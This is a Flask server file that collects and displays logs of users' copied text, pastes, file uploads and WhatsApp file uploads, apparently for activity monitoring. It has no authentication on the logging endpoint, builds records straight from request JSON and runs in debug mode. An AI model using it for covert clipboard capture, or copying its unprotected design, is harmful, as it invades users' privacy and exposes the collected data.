from flask import Flask, request, render_template, jsonify
from database import db, CopyLog, PasteLog, FileUploadLog, WhatsappFileUploadLog

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///logs.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db.init_app(app)

# Create database tables
with app.app_context():
    db.create_all()


@app.route('/logs/<log_type>', methods=['POST'])
def log(log_type):
    data = request.json
    if log_type == 'copy':
        log_entry = CopyLog(**data)
    elif log_type == 'paste':
        log_entry = PasteLog(**data)
    elif log_type == 'file_upload':
        log_entry = FileUploadLog(**data)
    elif log_type == 'whatsapp_file_upload':
        log_entry = WhatsappFileUploadLog(**data)
    else:
        return jsonify({'error': 'Invalid log type'}), 400

    db.session.add(log_entry)
    db.session.commit()
    return jsonify({'message': 'Log added successfully'}), 201

@app.route('/')
def index():
    # Fetch initial copy logs
    initial_logs = CopyLog.query.order_by(CopyLog.timestamp.desc()).limit(50).all()
    
    # Convert logs to dictionary for template rendering
    logs = []
    for log in initial_logs:
        log_dict = {
            'id': log.id,
            'user_id': log.user_id,
            'copied_text': log.copied_text,
            'url': log.url,
            'timestamp': log.timestamp.isoformat()
        }
        logs.append(log_dict)
    
    # Prepare log types for dropdown
    log_types = [
        {'value': 'copy', 'label': 'Copy Logs'},
        {'value': 'paste', 'label': 'Paste Logs'},
        {'value': 'file-upload', 'label': 'File Upload Logs'},
        {'value': 'whatsapp-file-upload', 'label': 'Whatsapp File Upload Logs'}
    ]
    
    return render_template('index.html', logs=logs, log_types=log_types)

@app.route('/get_logs')
def get_logs():
    log_type = request.args.get('type', 'copy')
    page = request.args.get('page', 1, type=int)
    per_page = 50

    log_models = {
        'copy': CopyLog,
        'paste': PasteLog,
        'file-upload': FileUploadLog,
        'whatsapp-file-upload': WhatsappFileUploadLog
    }

    model = log_models.get(log_type)
    if not model:
        return jsonify({"error": "Invalid log type"}), 400

    # Paginate logs
    pagination = model.query.order_by(model.timestamp.desc()).paginate(
        page=page, 
        per_page=per_page, 
        error_out=False
    )

    logs = []
    for log in pagination.items:
        log_dict = {c.name: getattr(log, c.name) for c in log.__table__.columns}
        log_dict['timestamp'] = log_dict['timestamp'].isoformat()
        logs.append(log_dict)

    return jsonify({
        'logs': logs,
        'total_pages': pagination.pages,
        'current_page': page
    })

if __name__ == '__main__':
    app.run(debug=True)